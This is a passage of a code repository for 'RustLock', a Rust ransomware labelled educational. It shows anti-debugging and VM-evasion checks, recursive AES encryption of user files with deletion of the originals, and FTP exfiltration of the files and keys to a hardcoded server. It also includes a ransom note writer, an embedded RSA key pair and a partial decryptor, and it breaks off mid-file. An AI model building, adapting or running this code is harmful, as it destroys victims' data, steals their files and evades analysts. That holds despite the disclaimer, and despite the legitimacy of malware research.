P7NLKN7KKYNYS4n6pDs0uaDdfM/4vJ9J3hhQiuluQ7W9rmXWlFmOv9plTLjaabka
WdLlKdu6yV8Lqk1kark4QP49b6k2bwbucXZcfjMYMDtHoHK9HPub7iGIrdedb7BF
fzG8atABMDXsAELNmLoWz3XTyF1ROYjn68F0WJGa5Ex+nlfdzI0KSvF97QL5rHXf
tKzuJ4IZjgO+TgHCIaulIQZDkwgCc7XcSkCJqLkmCnINlT5+S7VdQmQ2RTpdEhxI
2q/hMjPpAgMBAAECggEAHglTQeewgatdgtpuIgfT6QX0wjCYazkUBX2T2fQd6ewc
ZfBML66czX9tsOMhNyHdNA4bvkau2m/b90d2fS8W/1E1Tvl8i7XSdplNN9pzhoA4
waCZrJJK7nzWxz1BfSahEV+eeRZVkcCFwt1FyARLzcbf5OV47gghwb3dSG5w6Ykd
RMKUxgnbqPj8UrRelooi2uywz4z0qi40So2USS1+o7Xt1d02qwRX4lElReL81Sxp
u+LcmMXdiZ3NJIPUNey8vZbeT9dySxg1RRXWXNBm22nOXQhpfktTIqTWr1dl4bGn
3FOOZbKlmcYdiphKFSeCEj39UmI0lt/R2JkZBnK7wwKBgQDM9EFl136W2TsaJof3
AOMMai4gHeizqzMR8RefhPF/UqytWTKq82mywfxrU1BqEWckFRUajO43A/ZgrIJ5
IlwQnGznrvmxO4ugbQUuKNYUnvMJN15KY7tln+uGJQtldXes/gZC+czgWPQUbua9
EWqbfNyDLf+S62L8S4oFGw/bqwKBgQC7ZjJCR/lN5Ch8z1RCvnw6AAOyKCcc62GN
4GRa25HJPSuiLS++sfDs9V+wBE/mDnF99VA36RMcsxjo28v+2lO5EvsaQKD/c8yi
f3QkcwX7uJSQT1VIWrSkg9G945WIU1ZSpDD94QGMA+4KBNjQDDzAcOELN/KiJSl1
HB1ydog6uwKBgBJt4DeNIgfkbqkST+WJAeGK5qzio5sMSOJTIIGqjaCaSYao36J5
ksaNJOptqmxvNiwLbUNe6sitpYjZ2j2UNl0UA8Lte+xQ42RAiVe2OlHOXSI2BVeB
Eke4EpCUYir0XheDHAMHvUFrHj98HWlg2Io0twtgpnuKiPMQw89juJBTAoGAJfqm
QOyZSAHveqwCJay5PH/4P8kHdEL3+Gr7q7ZIK4KsLyf9PyaM71kjVWbqUnOm6KIo
6cvgxbY+XCL/itzwjteb8Ewc1OjBFkXCYgi1s7hK05xgalOHvLfCcDuJeKF7IzCH
hUxupdO+EGW/ExsHzPCTi1SBZf8mEcfq5+HB5jUCgYEAkPrAdjOnnmWkr72u7/Bn
+wfFRVeHCOmQDSN3+/sopZyqQdWvfV8uaPU3UEg2TmC28/Rr8IOD6HrxX/qbm/gh
GEPpxab8pRtDc9WxBNmaojQ2FYCF3J0c3oZ9VCRR+CyDcUWOE0LphMT59LlXM6h/
sb+ODQUmiQFB2eLUuYFe25o=
-----END PRIVATE KEY-----


================================================
File: RustLock/keys/public_key.pem
================================================
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlgg9VDhbawwNRaUdiiFs
BbHaNYvcNmNbaZkQcuH/oUq5sQL/WJF8oa0odpFNxJvTMzu/+I4QvkAkWj+zSyje
yimDWEuJ+qQ7NLmg3XzP+LyfSd4YUIrpbkO1va5l1pRZjr/aZUy42mm5GlnS5Snb
uslfC6pNZGq5OED+PW+pNm8G7nF2XH4zGDA7R6ByvRz7m+4hiK3XnW+wRX8xvGrQ
ATA17ABCzZi6Fs9108hdUTmI5+vBdFiRmuRMfp5X3cyNCkrxfe0C+ax137Ss7ieC
GY4Dvk4BwiGrpSEGQ5MIAnO13EpAiai5JgpyDZU+fku1XUJkNkU6XRIcSNqv4TIz
6QIDAQAB
-----END PUBLIC KEY-----


================================================
File: RustLock/src/antireversing.rs
================================================
extern crate winapi;

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::{env, fs::File, io::Write, ptr::null_mut};
use winapi::{
    shared::minwindef::HMODULE,
    um::{
        debugapi::IsDebuggerPresent,
        handleapi::CloseHandle,
        processthreadsapi::OpenProcess,
        psapi::{EnumProcessModules, EnumProcesses, GetModuleBaseNameW},
        winnt::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
        winuser::{
            SystemParametersInfoW, SPIF_SENDWININICHANGE, SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER,
        },
    },
};

// Sets the desktop background to an image included in the binary
pub fn change_wallpaper() -> Result<(), String> {
    let image_data = include_bytes!("../resources/wallpaper.jpg");
    let mut temp_path = env::temp_dir();
    temp_path.push("background.jpg");

    let mut file =
        File::create(&temp_path).map_err(|_| "Failed to create the temp file for the wallpaper")?;
    file.write_all(image_data)
        .map_err(|_| "Failed to write to the temp file")?;

    let path_str = temp_path
        .to_str()
        .ok_or("Failed to convert the path to string")?;
    let pwstr = str_to_pwstr(path_str);

    let success = unsafe {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            pwstr.as_ptr() as *mut _,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE,
        ) != 0
    };

    if success {
        Ok(())
    } else {
        Err("Failed to change the wallpaper".into())
    }
}

// Converts a Rust string to a wide string vector for use with Windows APIs
fn str_to_pwstr(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

// Implements basic anti-reversing techniques
pub fn anti_reversing() {
    #[cfg(debug_assertions)]
    {
        println!("==============================");
        println!("Starting anti-reversing checks");
        println!("==============================");
    }

    if !debugger_present() && !check_suspicious_processes() {
        #[cfg(debug_assertions)]
        {
            println!("Debugger or suspicious processes found");
        }
        std::process::exit(0);
    }

    #[cfg(debug_assertions)]
    {
        println!("==============================");
        println!("Finished anti-reversing checks");
        println!("==============================");
    }
}

// Checks for a debugger using the Windows API
fn debugger_present() -> bool {
    unsafe { IsDebuggerPresent() != 0 }
}

// Scans for processes and matches them against a list of known suspicious ones to detect virtual environments
fn check_suspicious_processes() -> bool {
    let mut processes = vec![0u32; 1024];
    let mut needed = 0u32;

    if unsafe {
        EnumProcesses(
            processes.as_mut_ptr(),
            (processes.len() * std::mem::size_of::<u32>()) as u32,
            &mut needed,
        )
    } == 0
    {
        return false;
    }

    let num_processes = needed as usize / std::mem::size_of::<u32>();
    processes[..num_processes].iter().any(|&pid| {
        if pid == 0 {
            return false;
        }
        let process_name = get_process_name(pid);
        process_name.is_some() && is_process_suspicious(&process_name.unwrap())
    })
}

// Retrieves the name of a process
fn get_process_name(pid: u32) -> Option<String> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid);
        if process_handle.is_null() {
            return None;
        }

        let mut main_module = null_mut();
        let mut needed = 0;
        if EnumProcessModules(
            process_handle,
            &mut main_module,
            std::mem::size_of::<HMODULE>() as u32,
            &mut needed,
        ) == 0
        {
            CloseHandle(process_handle);
            return None;
        }

        let mut process_name = vec![0u16; needed as usize / 2];
        if GetModuleBaseNameW(
            process_handle,
            main_module,
            process_name.as_mut_ptr(),
            process_name.len() as u32,
        ) > 0
        {
            CloseHandle(process_handle);
            process_name.retain(|&c| c != 0);
            return Some(String::from_utf16(&process_name).unwrap());
        }

        CloseHandle(process_handle);
        None
    }
}

// Checks if the process name is in the list of known suspicious ones
fn is_process_suspicious(name: &str) -> bool {
    let suspicious_processes = [
        "vmsrvc",
        "tcpview",
        "wireshark",
        "fiddler",
        "vmware",
        "VirtualBox",
        "procexp",
        "autoit",
        "vboxtray",
        "vmtoolsd",
        "vmrawdsk",
        "vmusbmouse",
        "df5serv",
        "vboxservice",
    ];
    suspicious_processes
        .iter()
        .any(|&proc| name.to_lowercase().contains(proc))
}


================================================
File: RustLock/src/config.rs
================================================
pub static SERVER_FTP: &str = "192.168.1.20:2121";

pub static RANSOM_EXT: &str = "m3str3";

pub static DIR_NAMES: [&str; 1] = ["Desktop\\folder"];

pub static VALID_EXTENSIONS: [&str; 53] = [
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".jpg", ".jpeg", ".png",
    ".gif", ".bmp", ".tiff", ".psd", ".ai", ".mp3", ".wav", ".wma", ".aac", ".flac", ".ogg",
    ".midi", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv", ".webm", ".mpg", ".m4v", ".zip",
    ".rar", ".7z", ".gz", ".tar", ".iso", ".dmg", ".apk", ".exe", ".msi", ".bin", ".bat", ".sh",
    ".js", ".html", ".css", ".php", ".sql", ".ico", ".svg", ".webp",
];

pub static RANSOM_NOTE: &str =
    "######################################################################
##                                                                  ##
##                        RANSOMWARE M3STR3                         ##
##                                                                  ##
######################################################################

// ======================= ! WARNING ! ======================

This ransomware has been developed strictly for educational purposes and I,
Ignacio Jose Mestre Villagrasa, disclaim any responsibility for uses beyond
learning and experimentation. Seriously, don't get any funny ideas!

// ======================= ! WARNING ! ======================

Author: Ignacio Jose Mestre Villagrasa
GitHub: https://github.com/M3str3
Repository: https://github.com/M3str3/rust-ransomware

// ======================= FEATURES ======================

Welcome to Ransomware M3STR3, a simple piece of educational
software.

Before you get too excited, remember:
- This is NOT intended for evil mastermind plans. If you're looking to start
  your career in villainy, you're in the wrong place.
- This ransomware encrypts files using AES, which is both secure and quite
  effective for learning purposes.
- No actual ransom is involved. Your files are safe, and no bitcoins will
  be harmed in the process of this educational endeavor.


Lastly, if this ransomware encrypts your homework, don't blame me. Blame your curiosity. 

Stay curious, stay ethical, and happy coding!

Ignacio,

KEY = %KEY%
";


================================================
File: RustLock/src/lib.rs
================================================
pub mod antireversing;
pub mod config;
pub mod cypher;
pub mod decypher;


================================================
File: RustLock/src/locker.rs
================================================
mod antireversing;
mod config;
mod cypher;

use base64;
use std::fmt::format;

use cypher::walker::walk_and_encrypt_directories;

pub const PUBLIC_KEY_PEM: &str = r#"-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlgg9VDhbawwNRaUdiiFs
BbHaNYvcNmNbaZkQcuH/oUq5sQL/WJF8oa0odpFNxJvTMzu/+I4QvkAkWj+zSyje
yimDWEuJ+qQ7NLmg3XzP+LyfSd4YUIrpbkO1va5l1pRZjr/aZUy42mm5GlnS5Snb
uslfC6pNZGq5OED+PW+pNm8G7nF2XH4zGDA7R6ByvRz7m+4hiK3XnW+wRX8xvGrQ
ATA17ABCzZi6Fs9108hdUTmI5+vBdFiRmuRMfp5X3cyNCkrxfe0C+ax137Ss7ieC
GY4Dvk4BwiGrpSEGQ5MIAnO13EpAiai5JgpyDZU+fku1XUJkNkU6XRIcSNqv4TIz
6QIDAQAB
-----END PUBLIC KEY-----"#;

fn main() {
    // ===================================================================================
    // STEP 1: Anti-Reversing Checks
    // ===================================================================================
    // This module attempts to detect debugging or reverse engineering attempts.
    antireversing::anti_reversing();

    // ===================================================================================
    // STEP 2: AES Key Generation
    // ===================================================================================
    let key: Vec<u8> = cypher::lib::generate_key();

    #[cfg(debug_assertions)]
    {
        println!("==============================");
        println!("Generated AES Key: {:?}", key);
        println!("Key Size: {} bytes", key.len());
        println!("==============================");
    }

    // ===================================================================================
    // STEP 3: Walking Through User Directories and Encrypting Files
    // ===================================================================================
    let user: String = cypher::walker::get_user_name().unwrap();
    let file_tree = walk_and_encrypt_directories(
        user.clone(),
        &config::DIR_NAMES,
        config::RANSOM_EXT,
        &config::VALID_EXTENSIONS,
        &key,
    );

    // ===================================================================================
    // STEP 4: File Tree Generation and Data Exfiltration
    // ===================================================================================
    let exfiltration_base_path: String = format!("{}/", user.clone());

    // Preparing an output log for affected files
    let mut output: String = String::new();
    output.push_str("Files affected:\n");
    output.push_str("=========================\n");

    for file in file_tree.files {
        output.push_str(&format!("- {}\n", file));

        #[cfg(debug_assertions)]
        println!("Exfiltrating: {}", file);

        let output_path: String = exfiltration_base_path.clone() + "data/" + file.as_str();
        let _ = cypher::ftp::upload_file(config::SERVER_FTP, &output_path, &file);
    }

    // ===================================================================================
    // STEP 5: Writing and Uploading File Tree to Server
    // ===================================================================================
    let desktop_path: String = format!("C:\\Users\\{}\\Desktop", user.clone());
    let file_tree_path: String = format!("{}\\file_tree.txt", desktop_path);
    let _ = std::fs::write(file_tree_path.clone(), output);

    let remote_file_tree: String = exfiltration_base_path.clone() + "file_tree.txt";
    let _ = cypher::ftp::upload_file(config::SERVER_FTP, &remote_file_tree, &file_tree_path);

    // ===================================================================================
    // STEP 6: Encrypting AES Key with RSA 
    // ===================================================================================
    let aes_key_enc: Vec<u8> = cypher::lib::encrypt_aes_key(key, PUBLIC_KEY_PEM);
    let encoded_key: String = base64::encode(&aes_key_enc);

    #[cfg(debug_assertions)]
    println!("AES Key (AES+RSA in Base64): {}", encoded_key);

    // ===================================================================================
    // STEP 7: Writing and Uploading Ransom Note, it has the AES+RSA+base64 key
    // ===================================================================================
    cypher::lib::write_ransom_note(&user, encoded_key, config::RANSOM_NOTE).unwrap();

    let note_path: String = format!("C:\\Users\\{}\\Desktop\\README.txt", user.clone());
    let remote_file_tree: String = exfiltration_base_path + "key";
    let _ = cypher::ftp::upload_file(config::SERVER_FTP, &remote_file_tree, &note_path);
}


================================================
File: RustLock/src/unlocker.rs
================================================
mod antireversing;
mod config;
mod decypher;

// ===================================================================================
// AES Key Recovery Process
// ===================================================================================
// The `build.rs` script restore the key from the base64 string on ransom note
// The AES key is stored as a base64-encoded string in a build-time environment variable
const AES_KEY: &str = env!("AES_KEY");

fn main() {
    // ===================================================================================
    // STEP 1: Anti-Reversing Checks
    // ===================================================================================
    // This module attempts to detect debugging, reverse engineering, or tampering attempts
    // If any suspicious activity is detected, the program may terminate or trigger countermeasures
    antireversing::anti_reversing();

    // ===================================================================================
    // STEP 2: Decoding the AES Key
    // ===================================================================================
    // The AES key is originally stored in base64 format for safe storage and transport
    // Here, we decode it back into its raw binary format for use in decryption
    let aes_key =
        base64::decode(AES_KEY.trim()).expect("Error decoding AES key from base64");

    #[cfg(debug_assertions)]
    {
        println!("AES Key (Base64): {}", AES_KEY);
        println!("Decoded AES Key: {:?}", aes_key);
        println!("AES Key Size: {} bytes", aes_key.len());
    }

    // ===================================================================================
    // STEP 3: Decrypting Files in Target Directories
    // ===================================================================================
    // This step walks through predefined directories and decrypts files that match
    // the specified ransomware extension (`config::RANSOM_EXT`)
    // Any file with the target extension will be restored to its original form
    decypher::walker::walk_decrypt(&config::DIR_NAMES, &aes_key, config::RANSOM_EXT);
}


================================================
File: RustLock/src/cypher/cypher.rs
================================================
// ==========================================================================//
//                               ENCRYPTION.RS                               //
// ==========================================================================//

extern crate winapi;

use std::ffi::CStr;
use std::ffi::CString;
use std::ptr::null_mut;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, ReadFile, WriteFile, OPEN_ALWAYS, OPEN_EXISTING};
use winapi::um::handleapi::CloseHandle;
use winapi::um::wincrypt::{
    CryptAcquireContextA, CryptDestroyKey, CryptEncrypt, CryptImportKey, CryptReleaseContext,
    CRYPT_VERIFYCONTEXT, HCRYPTKEY, HCRYPTPROV, PROV_RSA_AES,
};
use winapi::um::winnt::DELETE;
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, FILE_READ_DATA, FILE_SHARE_READ, FILE_WRITE_DATA, HANDLE,
};

/// Función para encriptar un archivo usando la clave RSA pasada como parámetro.
pub fn encrypt(source_file: CString, dest_file: CString, aes_key: Vec<u8>) -> bool {
    let mut h_key: HCRYPTKEY = 0usize;
    let mut h_crypt_prov: HCRYPTPROV = 0usize;

    unsafe {
        if CryptAcquireContextA(
            &mut h_crypt_prov,
            null_mut(),
            null_mut(),
            PROV_RSA_AES,
            CRYPT_VERIFYCONTEXT,
        ) == 0
        {
            println!(
                "Error during CryptAcquireContext! Error code: {}",
                GetLastError()
            );
            return false;
        } else {
            println!("A cryptographic provider has been acquired.");
        }

        // Importa la clave RSA que se pasa como parámetro.
        if CryptImportKey(
            h_crypt_prov,
            aes_key.as_ptr(),
            aes_key.len() as u32,
            0,
            0,
            &mut h_key,
        ) == 0
        {
            println!("Failed to import key, error: {:?}", GetLastError());
            return false;
        } else {
            println!("Import successful. The key is 0x{:x}", h_key);
        }

        let block_len: u32 = 960;
        let buffer_len: u32 = 960;

        let mut pb_buffer: Vec<u8> = vec![0u8; buffer_len as usize];
        println!("Memory has been allocated for the buffer.");

        // Abre el archivo fuente para leer.
        let source_handle: HANDLE = CreateFileA(
            source_file.as_ptr(),
            FILE_READ_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        // Abre el archivo destino para escribir.
        let dest_handle: HANDLE = CreateFileA(
            dest_file.as_ptr(),
            FILE_WRITE_DATA | DELETE,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        let mut eof = 0;
        let mut count = 0;

        // Bucle que lee, encripta y escribe el contenido.
        while eof == 0 {
            if ReadFile(
                source_handle,
                pb_buffer.as_mut_ptr() as *mut _,
                block_len,
                &mut count,
                null_mut(),
            ) == 0
            {
                let c_str: &CStr = &source_file;
                match c_str.to_str() {
                    Ok(str_slice) => println!("Converted CString to str: {}", str_slice),
                    Err(e) => eprintln!("Failed to convert CString to str: {:?}", e),
                }
                println!("Error reading");
                break;
            }
            if count < block_len {
                eof = 1;
            }
            if CryptEncrypt(
                h_key,
                0,
                eof,
                0,
                pb_buffer.as_mut_ptr(),
                &mut count,
                buffer_len,
            ) == 0
            {
                println!("Failed to encrypt, error: 0x{:x}", GetLastError());
                break;
            }
            if WriteFile(
                dest_handle,
                pb_buffer.as_ptr() as *const _,
                count,
                &mut count,
                null_mut(),
            ) == 0
            {
                println!("Failed to write");
                break;
            }
        }
        CloseHandle(source_handle);
        CloseHandle(dest_handle);
        CryptDestroyKey(h_key);
        CryptReleaseContext(h_crypt_prov, 0);
    }
    true
}


================================================
File: RustLock/src/cypher/ftp.rs
================================================
use std::fs::File;
use std::io::Read;
use suppaftp::FtpStream;

pub fn upload_file(
    ftp_server: &str,
    remote_path: &str,
    local_file: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut ftp_stream = FtpStream::connect(ftp_server)?;

    // Iniciar sesión como usuario anónimo
    ftp_stream.login("anonymous", "anonymous@domain.com")?;

    // Extraer la carpeta y el nombre del archivo
    let parts: Vec<&str> = remote_path.rsplitn(2, '/').collect();
    let remote_folder = parts.get(1).unwrap_or(&"/"); // Carpeta remota
    let file_name = parts.get(0).unwrap(); // Nombre del archivo

    // Intentar crear la carpeta (sin error si ya existe)
    ftp_stream.cwd("/")?; // Ir al directorio raíz
    for folder in remote_folder.split('/') {
        if !folder.is_empty() {
            let _ = ftp_stream.mkdir(folder);
            ftp_stream.cwd(folder)?; // Entrar en la carpeta
        }
    }

    // Leer el archivo local
    let mut file = File::open(local_file)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;

    // Subir el archivo
    ftp_stream.put_file(file_name, &mut &contents[..])?;

    // Cerrar sesión
    ftp_stream.quit()?;

    Ok(())
}


================================================
File: RustLock/src/cypher/lib.rs
================================================
use passwords::PasswordGenerator;
use rand::rngs::OsRng;
use rsa::pkcs8::DecodePublicKey;
use rsa::{Oaep, RsaPublicKey};
use sha2::Sha256;
use std::fs::File;
use std::io::Write;

pub fn encrypt_aes_key(aes_key: Vec<u8>, public_pem: &str) -> Vec<u8> {
    let public_key =
        RsaPublicKey::from_public_key_pem(public_pem).expect("Error al parsear la clave pública");
    let mut rng = OsRng;
    // Usamos el tipo Oaep para crear el padding OAEP con SHA256
    let padding = Oaep::new::<Sha256>();

    public_key
        .encrypt(&mut rng, padding, &aes_key)
        .expect("Error al encriptar")
}
// AES Key gen
pub fn generate_key() -> Vec<u8> {
    let mut blob: Vec<u8> = vec![8u8, 2, 0, 0, 15, 102, 0, 0, 24, 0, 0, 0];
    let generator: PasswordGenerator = PasswordGenerator {
        length: 120,
        numbers: true,
        lowercase_letters: true,
        uppercase_letters: true,
        symbols: true,
        spaces: true,
        exclude_similar_characters: false,
        strict: true,
    };

    let generated_key = generator.generate_one().unwrap();
    blob.extend(generated_key.as_bytes());
    blob
}

// Escribe la nota de rescate en el escritorio del usuario
pub fn write_ransom_note(
    user: &str,
    encoded_key: String,
    ransom_note: &str,
) -> Result<(), std::io::Error> {
    let desktop_path = format!("C:\\Users\\{}\\Desktop", user);
    let note_path = format!("{}\\README.txt", desktop_path);
    let note_content = ransom_note.replace("%KEY%", &encoded_key);
    let mut file = File::create(note_path)?;

    writeln!(&mut file, "{}", note_content)?;
    Ok(())
}


================================================
File: RustLock/src/cypher/mod.rs
================================================
pub mod cypher;
pub mod ftp;
pub mod lib;
pub mod walker;


================================================
File: RustLock/src/cypher/walker.rs
================================================
// walker.rs

extern crate winapi;

use crate::cypher::cypher::encrypt;
use std::ffi::CString;
use std::path::PathBuf;
use std::ptr::null_mut;
use std::{env, str};

use winapi::shared::minwindef::FILETIME;
use winapi::um::fileapi::{DeleteFileA, FindFirstFileA, FindNextFileA};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::minwinbase::WIN32_FIND_DATAA;
use winapi::um::winbase::GetUserNameA;
use winapi::um::winnt::{FILE_ATTRIBUTE_DIRECTORY, HANDLE};

/// Stores the paths of encrypted files.
pub struct FileTree {
    pub files: Vec<String>,
}

/// Retrieves the current user's name from the system.
///
/// # Returns
/// * `Ok(String)` with the user name, or
/// * `Err(std::io::Error)` if the operation fails.
pub fn get_user_name() -> Result<String, std::io::Error> {
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();

    unsafe {
        // First call determines the required buffer size.
        GetUserNameA(null_mut(), &mut size);

        buffer.resize(size as usize, 0i8);

        // Second call populates the buffer with the user name.
        if GetUserNameA(buffer.as_mut_ptr(), &mut size) == 0 {
            return Err(std::io::Error::last_os_error());
        }
        // Resize the buffer to remove the null terminator.
        buffer.resize((size - 1) as usize, 0);
    }

    // Convert i8 buffer to a UTF-8 string.
    Ok(String::from_utf8_lossy(
        &buffer.iter().map(|&c| c as u8).collect::<Vec<u8>>()
    ).to_string())
}

/// Traverses the specified directories, encrypts matching files, and returns a FileTree 
/// containing the paths of encrypted files.
///
/// # Arguments
/// * `user_name`        - The system user name used to form the path.
/// * `dir_names`        - List of directory names to explore (e.g., "Documents", "Downloads").
/// * `ransom_ext`       - Extension appended to encrypted files.
/// * `valid_extensions` - Allowed file extensions that can be encrypted.
/// * `aes_key`          - AES key used for encryption.
pub fn walk_and_encrypt_directories(
    user_name: String,
    dir_names: &[&str],
    ransom_ext: &str,
    valid_extensions: &[&str],
    aes_key: &[u8],
) -> FileTree {
    let mut file_tree = Vec::new();

    for dir in dir_names.iter() {
        let full_path = format!("C:\\Users\\{}\\{}", user_name, dir);
        #[cfg(debug_assertions)]
        {
            println!("Exploring: {}", full_path);
        }
        encrypt_directory_contents(
            &full_path,
            ransom_ext,
            valid_extensions,
            aes_key,
            &mut file_tree,
        );
    }

    FileTree { files: file_tree }
}

/// Explores the contents of a directory and updates the file tree with encrypted files.
///
/// # Arguments
/// * `dir_path`         - The path to the directory to be explored.
/// * `ransom_ext`       - Extension appended to encrypted files.
/// * `valid_extensions` - Allowed file extensions that can be encrypted.
/// * `aes_key`          - AES key used for encryption.
/// * `file_tree`        - Reference to a vector holding the paths of encrypted files.
fn encrypt_directory_contents(
    dir_path: &str,
    ransom_ext: &str,
    valid_extensions: &[&str],
    aes_key: &[u8],
    file_tree: &mut Vec<String>,
) {
    // Appends "\*" to search all files and subdirectories within dir_path.
    let full_path = CString::new(format!("{}\\*", dir_path)).unwrap();
    let _ = traverse_and_encrypt(full_path, ransom_ext, valid_extensions, aes_key, file_tree);
}

/// Recursively traverses the directory and encrypts files with allowed extensions. 
/// If encryption succeeds, the destination file path is added to the file tree.
///
/// # Arguments
/// * `dir_name`         - Directory name as a CString.
/// * `ransom_ext`       - Extension appended to encrypted files.
/// * `valid_extensions` - Allowed file extensions that can be encrypted.
/// * `aes_key`          - AES key used for encryption.
/// * `file_tree`        - Reference to a vector holding the paths of encrypted files.
fn traverse_and_encrypt(
    dir_name: CString,
    ransom_ext: &str,
    valid_extensions: &[&str],
    aes_key: &[u8],
    file_tree: &mut Vec<String>,
) -> Result<(), std::io::Error> {
    unsafe {
        let mut file_data: WIN32_FIND_DATAA = WIN32_FIND_DATAA {
            dwFileAttributes: 0,
            ftCreationTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            ftLastAccessTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            ftLastWriteTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            nFileSizeHigh: 0,
            nFileSizeLow: 0,
            dwReserved0: 0,
            dwReserved1: 0,
            cFileName: [0i8; 260],
            cAlternateFileName: [0i8; 14],
        };

        let h_find: HANDLE = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
        if h_find == INVALID_HANDLE_VALUE {
            return Ok(());
        }

        loop {
            let mut name_buffer: Vec<u8> = Vec::new();
            for byte in file_data.cFileName.iter() {
                if *byte == 0 {
                    break;
                }
                name_buffer.push(*byte as u8);
            }

            // If it's not a directory, process the file.
            if file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 {
                let curr = dir_name.as_bytes();
                let new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                let file_path = PathBuf::from(String::from_utf8_lossy(&new_dir).to_string());

                // Skip encrypting the running executable.
                if file_path.exists() {
                    let current_exe_path = env::current_exe().expect("Unable to get the exe path");
                    if current_exe_path.canonicalize().unwrap() == file_path.canonicalize().unwrap() {
                        println!("Skipping the current executable");
                    }
                }

                // Extract file extension based on the last dot.
                let dot_position = match new_dir.iter().rposition(|&x| x == b'.') {
                    Some(pos) => pos,
                    None => {
                        eprintln!("Error: No '.' found in the file name");
                        return Ok(());
                    }
                };
                let extension = &new_dir[dot_position..];

                // Check if the extension is in the list of valid extensions.
                let is_valid = valid_extensions
                    .iter()
                    .any(|&ext| CString::new(ext).unwrap() == CString::new(extension).unwrap());
                if is_valid {
                    let source_file_name = new_dir.clone();
                    let mut dest_file_name = source_file_name.clone();
                    dest_file_name.extend_from_slice(format!(".{}", ransom_ext).as_bytes());

                    let encrypt_result = encrypt(
                        CString::new(&source_file_name[..]).unwrap(),
                        CString::new(&dest_file_name[..]).unwrap(),
                        aes_key.to_vec(),
                    );
                    let source_file_str = String::from_utf8(source_file_name)
                        .unwrap_or_else(|_| "Invalid UTF-8".to_string());
                    let dest_file_str = String::from_utf8(dest_file_name)
                        .unwrap_or_else(|_| "Invalid UTF-8".to_string());
                    println!("{} -> {}", source_file_str, dest_file_str);

                    if encrypt_result {
                        // Add the path of the encrypted file to the file tree.
                        file_tree.push(dest_file_str.clone());
                        // Delete the original file after successful encryption.
                        let _delete_result = DeleteFileA(
                            CString::new([&curr[..curr.len() - 1], &name_buffer[..]].concat())
                                .unwrap()
                                .as_ptr(),
                        );
                    }
                }
            } else {
                // Handle directories, excluding "." and "..".
                let name_string = String::from_utf8(name_buffer.clone()).expect("Invalid UTF-8");
                if name_string != "." && name_string != ".." {
                    let curr = dir_name.to_bytes_with_nul();
                    let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                    new_dir.push(b'\\');
                    new_dir.extend_from_slice(b"*");
                    let _ = traverse_and_encrypt(
                        CString::new(new_dir).unwrap(),
                        ransom_ext,
                        valid_extensions,
                        aes_key,
                        file_tree,
                    );
                }
            }

            // Move on to the next file or break if there are no more.
            if FindNextFileA(h_find, &mut file_data) == 0 {
                break;
            }
        }
        CloseHandle(h_find);
    }
    Ok(())
}


================================================
File: RustLock/src/decypher/decypher.rs
================================================
use std::ffi::CString;

use std::ptr::null_mut;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, ReadFile, WriteFile, OPEN_ALWAYS, OPEN_EXISTING};
use winapi::um::handleapi::CloseHandle;
use winapi::um::wincrypt::{
    CryptAcquireContextA, CryptDecrypt, CryptDestroyKey, CryptImportKey, CryptReleaseContext,
    CRYPT_VERIFYCONTEXT, HCRYPTKEY, HCRYPTPROV, PROV_RSA_AES,
};
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, FILE_READ_DATA, FILE_SHARE_READ, FILE_WRITE_DATA, HANDLE,
};

pub fn decrypt(source_file: CString, dest_file: CString, aes_key: Vec<u8>) -> bool {
    let mut h_key: HCRYPTKEY = 0usize; // key
    let mut h_crypt_prov: HCRYPTPROV = 0usize;
    unsafe {
        if CryptAcquireContextA(
            &mut h_crypt_prov,
            null_mut(),
            null_mut(),
            PROV_RSA_AES,
            CRYPT_VERIFYCONTEXT,
        ) == 0
        {
            println!("Error during CryptAcquireContext!");
            println!("Error code: {}", GetLastError());
            return false;
        } else {
            println!("A cryptographic provider has been acquired.");
        }

        if CryptImportKey(
            h_crypt_prov,
            aes_key.as_ptr(),
            aes_key.len() as u32,
            0,
            0,
            &mut h_key,
        ) == 0
        {
            println!("Import fail {:?}", GetLastError());
            return false;
        } else {
            println!("Import successful. Key is {}", h_key);
        }

        let src_handle: HANDLE = CreateFileA(
            source_file.as_ptr(),
            FILE_READ_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        let dest_handle: HANDLE = CreateFileA(
            dest_file.as_ptr(),
            FILE_WRITE_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_ALWAYS,
